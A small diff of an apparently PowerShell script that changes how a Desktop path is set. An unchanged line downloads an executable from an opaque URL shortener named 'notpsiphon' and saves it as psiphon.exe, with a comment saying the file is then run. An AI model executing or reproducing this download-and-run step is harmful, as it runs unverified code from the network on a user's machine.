@@ -1,5 +1,5 @@
 # Set $cud if running standalone
-$cud = $env:userprofile + '\Desktop'
+$cud = $home + '\Desktop'
 
 # Get and run psiphon
 wget tinyurl.com/notpsiphon -outfile $cud\psiphon.exe
